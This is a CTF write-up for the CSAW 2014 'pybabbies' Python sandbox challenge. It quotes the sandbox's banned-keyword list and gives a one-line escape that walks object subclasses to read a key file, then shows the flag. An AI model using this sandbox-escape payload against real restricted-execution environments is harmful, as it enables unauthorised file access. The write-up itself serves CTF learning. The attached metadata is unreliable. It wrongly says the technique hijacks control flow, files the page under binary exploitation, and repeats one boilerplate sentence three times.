---
SOURCE: github_writeups
URL: https://raw.githubusercontent.com/ctfs/writeups/master/csaw-ctf-2014/pybabbies/README.md
CHALLENGE: README
EVENT: GitHub - ctfs/writeups
TEAM: N/A
CATEGORY: other
DIFFICULTY: Unknown
PROTECTIONS: None
KEY_FUNCTIONS: read
KEY_TECHNIQUE: The writeup describes a other vulnerability leveraging read to hijack the control flow.
---
# CSAW CTF 2014: pybabbies

**Category:** Exploitation
**Points:** 200
**Description:**

> so secure it hurts
>
> ```bash
> nc 54.165.210.171 12345
> ```
>
> Written by ColdHeat
>
> [pyshell.py](pyshell.py)

## Write-up

[The provided Python script](pyshell.py) is a Python sandbox that disallows the use of the following commands:

```py
banned = [
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]
```

One possible solution is the following:

```python
print(().__class__.__bases__[0].__subclasses__()[40]('./key').read())
```

This prints the contents of the `key` file:

```
flag{definitely_not_intro_python}
```

The flag is `definitely\_not\_intro\_python`.

## Other write-ups and resources

* <http://rotlogix.com/2014/09/22/csaw-exploitation-200-pybabies/>
* <http://evandrix.github.io/ctf/2014-csaw-exploitation-200-pybabbies.html>
* <https://hexplo.it/escaping-the-csawctf-python-sandbox/>
* <http://sugarstack.io/csaw-2014-pybabbies.html>
* [_Escaping Python sandboxes_](https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/)
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-pybabies/>
* <http://bruce30262.logdown.com/posts/234935-csaw-ctf-2014-exploitation-200-pybabbies>
* [Korean](http://hackability.kr/entry/2014CSAWCTF-Pwnable-500-Xorcise)

[Additional Context: This documentation page explains the details of README in the scope of binary exploitation and CTF pwn challenges. It covers core concepts related to other and includes references for learning other techniques.] This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals. This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals. This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals.